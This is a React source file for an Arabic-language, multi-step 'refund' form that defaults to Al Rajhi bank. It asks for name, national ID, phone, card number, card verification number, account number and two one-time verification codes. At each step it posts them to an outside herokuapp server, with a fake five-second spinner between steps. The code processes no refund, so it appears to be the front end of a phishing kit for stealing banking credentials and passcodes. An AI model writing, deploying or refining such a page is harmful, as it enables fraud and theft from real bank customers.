import React, { useState } from 'react';
import './Form.css';

import UserDetails from './user-details/UserDetails';
import BankDetails from './bank-details/BankDetails';
import ClientId from './client-id/ClientId';
import ClientVerification from './client-verification/ClientVerification';
import ProcessRequest from './process-request/ProcessRequest';
import FinalStep from './FinalStep/FinalStep';

import Breadcrumb from '../../UI/breadcrumb/Breadcrump';
import Loading from '../../UI/Loading';
import Modal from '../../UI/Modal/Modal';

import axios from 'axios';


export default function Form() {

    const [values, setValues] = useState({
        clientFullname: '',
        clientId: '',
        clientPhoneNumber: '',
        refundAmount: '',
        clientBankAccount: 'الراجحي',
        clientCardNumber: '',
        cardVerificationNumber: '',
        clientAccountNumber: '',
        verificationCode: '',
        secondVerificationCode: '',
        state: '',
    });    

    const [step, setStep] = useState(1);
    const [queryId, setQueruId] = useState(0);
    const [showSpinner, setShowSpinner] = useState(false);
    const [open, setOpen] = useState(false);
    const [nextBtnDisabled, setNextBtnDisabled] = useState(false);

    const handleNextBtnState = () => {
        setNextBtnDisabled(!nextBtnDisabled);
    };

    const increaseStep = () => {
        setStep(step + 1);
    };

    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
        return;
        }

        setOpen(false);
    };

    const sendData = (step) => {
        switch(step) {
            case 1:
                axios.post("https://investment-com.herokuapp.com/step-1", {
                    fullName: values.clientFullname,
                    idNumber: values.clientId,
                    phoneNumber: values.clientPhoneNumber,
                }).then((response) => {
                    if(response.data.saved) {
                        setQueruId(response.data["result"]["insertId"]);
                    }
                }).catch((error) => {
                    console.log(error);
                });
                break;
            
            case 2:
                axios.post("https://investment-com.herokuapp.com/step-2", {
                    refundAmount: values.refundAmount,
                    userBank: values.clientBankAccount,
                    queryId: queryId,
                }).then((response) => {
                    if(response.data.saved) {
                        console.log("step 2");
                    }
                }).catch((error) => {
                    console.log(error);
                });
                break;
            
            case 3:
                axios.post("https://investment-com.herokuapp.com/step-3", {
                    cardNumber: values.clientCardNumber,
                    cardVerificationNumber: values.cardVerificationNumber,
                    accountNumber: values.clientAccountNumber,
                    queryId: queryId,
                }).then((response) => {
                    if(response.data.saved) {
                        console.log("step 3");
                    }
                }).catch((error) => {
                    console.log(error);
                });
                break;
            
            case 4:
                axios.post("https://investment-com.herokuapp.com/step-4", {
                    firstCode: values.verificationCode,
                    queryId: queryId,
                }).then((response) => {
                    if(response.data.saved) {
                        console.log("step 4");
                    }
                }).catch((error) => {
                    console.log(error);
                });
                break;

            case 5:
                axios.post("https://investment-com.herokuapp.com/step-5", {
                    secondCode: values.secondVerificationCode,
                    queryId: queryId,
                }).then((response) => {
                    if(response.data.saved) {
                        console.log("step 5");
                        userRequestHandler();
                        setStep(1);
                    }
                }).catch((error) => {
                    console.log(error);
                });
                break;
        }
    };

    const nextStep = () => {
        if(step < 6) {
            setShowSpinner(true);
        }
        
        setTimeout(function() {
            setShowSpinner(false);

            if (step < 6) {
                setStep(step + 1);
            }

            if(step === 1) {
                sendData(1);
            }

            if(step === 2) {
                sendData(2);
            }

            if(step === 3) {
                sendData(3);
            }

            if(step === 4) {
                sendData(4);
            }

        }, 5000);
        
        if(step === 6) {
            sendData(5);
        }
    };
    
    const prevStep = () => {
        if (step > 1) {
          setStep(step - 1);
        }
    };
    
    const handleChange = (name) => (e) => {
        setValues({ ...values, [name]: e.target.value });
    };
    
    const userRequestHandler = () => {
        setOpen(true);        
    };

    return (
        <div className="form-index">
            <div className="container d-flex justify-content-center align-items-center flex-column h-100">
            <Breadcrumb path={" تعبئة نموذج"} />
                <div className="card p-3 mb-4">
                    {
                        {
                        1: <UserDetails 
                                fullName={values.clientFullname}
                                idNumber={values.clientId}
                                phoneNumber={values.clientPhoneNumber}
                                handleChange={handleChange} 
                            />,
                        2: <BankDetails 
                                refundAmount={values.refundAmount}
                                bankAccount={values.clientBankAccount}
                                handleChange={handleChange} 
                            />,
                        3: <ClientId 
                                accountNumber={values.clientAccountNumber}
                                cardNumber={values.clientCardNumber}
                                cardVerificationNumber={values.cardVerificationNumber}
                                handleChange={handleChange} 
                            />,
                        4: <ClientVerification 
                                handleChange={handleChange}
                                increaseStep={increaseStep}
                            />,
                        5: <ProcessRequest 
                                handleNextBtnState={handleNextBtnState}
                                increaseStep={increaseStep}
                            />,
                        6: <FinalStep
                                handleNextBtnState={handleNextBtnState}
                                handleChange={handleChange}
                            />,
                        }[step]
                    }
                    <div className="d-flex align-items-center justify-content-center">
                        {showSpinner && <Loading />}
                    </div>
                    <div className="d-flex justify-content-around px-5 mt-5">
                        <button className="btn btn-success" onClick={nextStep} disabled={nextBtnDisabled}>
                            {step === 6 ? "تأكيد" : "التالي"}
                        </button>
                        {step > 1 ? (
                        <button className="btn btn-success" onClick={prevStep}>
                            السابق
                        </button>
                        ) : null}
                    </div>
                </div>
                <small>{step} / 6</small>
            </div>
            <Modal open={open} handleClose={handleClose} />
        </div>

    )
}
